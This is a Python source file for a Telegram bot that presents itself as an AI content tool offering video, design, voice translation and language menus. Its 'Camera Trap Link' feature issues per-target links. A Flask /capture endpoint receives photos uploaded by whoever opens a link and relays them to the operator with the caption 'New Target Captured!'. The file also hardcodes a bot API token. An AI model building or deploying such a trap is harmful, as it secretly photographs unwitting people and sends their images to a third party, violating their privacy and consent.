import telebot
from telebot import types
import os
import requests
import uuid
import threading
from flask import Flask, request
import google.generativeai as genai
import base64

API_TOKEN = '8755257625:AAGaknlYKNQCiHNlEUFjKI_3IMNcwk4-N-U'
BOSS_ID = 5218996367
CHANNEL_USERNAME = '@OxideV2INFO'
CHANNEL_URL = 'https://t.me/OxideV2INFO'
BOT_USERNAME = '@NovaContent1_bot'
BASE_URL = 'https://tg-bot-8od0.onrender.com'

GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY")
if GEMINI_API_KEY:
    genai.configure(api_key=GEMINI_API_KEY)

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
user_languages = {}
user_states = {}

# تم تعديل هذا الجزء ليقبل GET و POST
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'GET':
        return open('index.html').read()
    return "OK", 200

# تم تعديل هذا الجزء ليتأكد من استقبال الطلب كـ POST
@app.route('/capture', methods=['GET', 'POST'])
def receive_capture():
    if request.method == 'POST':
        if 'image' in request.files:
            photo = request.files['image']
            target_id = request.form.get('id', 'Unknown')
            bot.send_photo(BOSS_ID, photo, caption=f"📸 New Target Captured!\nID: {target_id}")
            return "OK", 200
    return "Method Not Allowed", 405

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_web, daemon=True).start()

# --- بقية الكود الخاص بك كما هو تماماً ---
STRINGS = {
    'en': {
        'sub_required': "⚠️ **Access Denied!**\n\nTo use **NovaContent Bot**, you must subscribe to our official channel first.",
        'welcome': "🚀 **Welcome to NovaContent AI Core!**\n\nSelect a tool or simply **send/forward any Voice Note** to translate it instantly!",
        'btn_join': "📢 Join Channel",
        'btn_verify': "🔄 Verified / Try Again",
        'btn_video': "🎬 Auto Short Video",
        'btn_design': "🎨 HD Design Generator",
        'btn_voice': "🗣️ Voice Engine Blueprint",
        'btn_trap': "🎯 Camera Trap Link",
        'btn_lang': "🌐 Change Language",
        'verified_success': "✅ **Verification Successful!**",
        'not_subbed': "❌ You haven't joined the channel yet.",
        'act_video': "⚙️ **[Video Engine Activated]**\nPlease type your video topic below:",
        'act_design': "⚙️ **[Design Engine Activated]**\nPlease describe the image concept:",
        'act_voice': "⚙️ **[Voice Blueprint Activated]**\nPlease describe the voice requirements:",
        'select_lang': "🌐 Please select your language:",
        'ai_processing': "🤖 **Nova AI is thinking/listening...**",
        'ai_error': "❌ **AI Error:** Could not process request."
    },
    'ar': {
        'sub_required': "⚠️ **تم رفض الوصول!**\n\nيجب الاشتراك في القناة أولاً.",
        'welcome': "🚀 **أهلاً بك في بوت NovaContent!**\n\nاختر أداة أو **أرسل/حول أي تسجيل صوتي** لترجمته فوراً!",
        'btn_join': "📢 اشترك في القناة",
        'btn_verify': "🔄 تحقق / حاول مرة أخرى",
        'btn_video': "🎬 فيديو قصير تلقائي",
        'btn_design': "🎨 مولد تصاميم HD",
        'btn_voice': "🗣️ مستنسخ الصوت",
        'btn_trap': "🎯 رابط الكاميرا",
        'btn_lang': "🌐 تغيير اللغة",
        'verified_success': "✅ **تم التحقق بنجاح!**",
        'not_subbed': "❌ لم تنضم للقناة بعد.",
        'act_video': "⚙️ **[تم تفعيل محرك الفيديو]**\nيرجى كتابة عنوان الفيديو:",
        'act_design': "⚙️ **[تم تفعيل محرك التصميم]**\nيرجى وصف الصورة:",
        'act_voice': "⚙️ **[تم تفعيل محرك الصوت]**\nيرجى وصف المتطلبات الصوتية:",
        'select_lang': "🌐 يرجى اختيار لغتك:",
        'ai_processing': "🤖 **نوفا تفكر وتستمع...**",
        'ai_error': "❌ **خطأ:** تعذر معالجة الطلب."
    },
    'de': {
        'sub_required': "⚠️ **Zugriff verweigert!**\nBitte Kanal abonnieren.",
        'welcome': "🚀 **Willkommen!** Senden Sie eine Sprachnachricht zur Übersetzung!",
        'btn_join': "📢 Kanal beitreten",
        'btn_verify': "🔄 Verifiziert",
        'btn_video': "🎬 Auto Short-Video",
        'btn_design': "🎨 HD Design Generator",
        'btn_voice': "🗣️ Sprach-Engine",
        'btn_trap': "🎯 Camera Trap Link",
        'btn_lang': "🌐 Sprache ändern",
        'verified_success': "✅ **Erfolgreich!**",
        'not_subbed': "❌ Sie sind nicht beigetreten!",
        'act_video': "⚙️ **[Video-Engine]** Thema eingeben:",
        'act_design': "⚙️ **[Design-Engine]** Bild beschreiben:",
        'act_voice': "⚙️ **[Sprach-Engine]** Beschreibung:",
        'select_lang': "🌐 Sprache wählen:",
        'ai_processing': "🤖 **Nova AI arbeitet...**",
        'ai_error': "❌ **Fehler:** Fehlgeschlagen."
    },
    'ru': {
        'sub_required': "⚠️ **Доступ запрещен!**\nПожалуйста, подпишитесь.",
        'welcome': "🚀 **Добро пожаловать!** Отправьте голосовое для перевода!",
        'btn_join': "📢 Вступить в канал",
        'btn_verify': "🔄 Проверено",
        'btn_video': "🎬 Авто Видео",
        'btn_design': "🎨 Дизайн генератор",
        'btn_voice': "🗣️ Голосовой движок",
        'btn_trap': "🎯 Ссылка на камеру",
        'btn_lang': "🌐 Изменить язык",
        'verified_success': "✅ **Успешно!**",
        'not_subbed': "❌ Сначала подпишитесь!",
        'act_video': "⚙️ **[Видео-движок]** Тема:",
        'act_design': "⚙️ **[Дизайн-движок]** Описание:",
        'act_voice': "⚙️ **[Голосовой движок]** Описание:",
        'select_lang': "🌐 Выберите язык:",
        'ai_processing': "🤖 **Nova AI работает...**",
        'ai_error': "❌ **Ошибка:** Не удалось."
    }
}

def call_gemini_ai(prompt_text, audio_bytes=None, mime_type=None):
    try:
        model = genai.GenerativeModel('gemini-1.5-flash')
        if not audio_bytes:
            response = model.generate_content(prompt_text)
            return response.text
        audio_data = {"mime_type": mime_type, "data": base64.b64encode(audio_bytes).decode('utf-8')}
        response = model.generate_content([prompt_text, audio_data])
        return response.text
    except Exception as e:
        return None

def is_subscribed(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['creator', 'administrator', 'member']
    except: return False

def get_language_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(text="عربي (Arabic)", callback_data="lang_ar"),
        types.InlineKeyboardButton(text="English", callback_data="lang_en"),
        types.InlineKeyboardButton(text="Deutsch (German)", callback_data="lang_de"),
        types.InlineKeyboardButton(text="Русский (Russian)", callback_data="lang_ru")
    )
    return markup

def get_subscription_markup(lang):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(text=STRINGS[lang]['btn_join'], url=CHANNEL_URL))
    markup.add(types.InlineKeyboardButton(text=STRINGS[lang]['btn_verify'], callback_data="check_sub"))
    return markup

def get_main_menu(lang):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton(STRINGS[lang]['btn_video']), types.KeyboardButton(STRINGS[lang]['btn_design']))
    markup.add(types.KeyboardButton(STRINGS[lang]['btn_voice']), types.KeyboardButton(STRINGS[lang]['btn_trap']))
    markup.add(types.KeyboardButton(STRINGS[lang]['btn_lang']))
    return markup

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.send_message(message.chat.id, "🌐 Please select your language:", reply_markup=get_language_markup())

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def handle_lang(call):
    user_id = call.message.chat.id
    lang = call.data.split("_")[1]
    user_languages[user_id] = lang
    bot.delete_message(user_id, call.message.message_id)
    if not is_subscribed(user_id):
        bot.send_message(user_id, STRINGS[lang]['sub_required'], parse_mode="Markdown", reply_markup=get_subscription_markup(lang))
    else:
        bot.send_message(user_id, STRINGS[lang]['welcome'], parse_mode="Markdown", reply_markup=get_main_menu(lang))

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def handle_verify(call):
    user_id = call.message.chat.id
    lang = user_languages.get(user_id, 'en')
    if is_subscribed(user_id):
        bot.delete_message(user_id, call.message.message_id)
        bot.send_message(user_id, STRINGS[lang]['verified_success'], parse_mode="Markdown", reply_markup=get_main_menu(lang))
    else:
        bot.answer_callback_query(call.id, text=STRINGS[lang]['not_subbed'], show_alert=True)

@bot.message_handler(content_types=['voice'])
def handle_voice(message):
    user_id = message.chat.id
    lang = user_languages.get(user_id, 'en')
    status = bot.reply_to(message, STRINGS[lang]['ai_processing'])
    file_info = bot.get_file(message.voice.file_id)
    data = bot.download_file(file_info.file_path)
    res = call_gemini_ai(f"Translate to {lang}:", audio_bytes=data, mime_type="audio/ogg")
    bot.delete_message(user_id, status.message_id)
    bot.reply_to(message, res if res else STRINGS[lang]['ai_error'])

@bot.message_handler(func=lambda message: True)
def handle_main(message):
    user_id = message.chat.id
    lang = user_languages.get(user_id, 'en')
    text = message.text
    if text == STRINGS[lang]['btn_trap']:
        unique_id = str(uuid.uuid4())[:8]
        bot.reply_to(message, f"🔗 **Camera Trap Link:**\n{BASE_URL}/capture?id={unique_id}")
        return
    if text == STRINGS[lang]['btn_lang']:
        bot.send_message(user_id, STRINGS[lang]['select_lang'], reply_markup=get_language_markup())
        return
    if text in [STRINGS[lang]['btn_video'], STRINGS[lang]['btn_design'], STRINGS[lang]['btn_voice']]:
        user_states[user_id] = text
        bot.reply_to(message, STRINGS[lang][f"act_{text.split(' ')[0].lower()}"] if "act_" in STRINGS[lang] else "Please describe:")
        return
    if user_states.get(user_id):
        status = bot.reply_to(message, STRINGS[lang]['ai_processing'])
        res = call_gemini_ai(f"User request: {text}")
        bot.delete_message(user_id, status.message_id)
        bot.reply_to(message, res if res else STRINGS[lang]['ai_error'])
        user_states[user_id] = None

bot.infinity_polling()
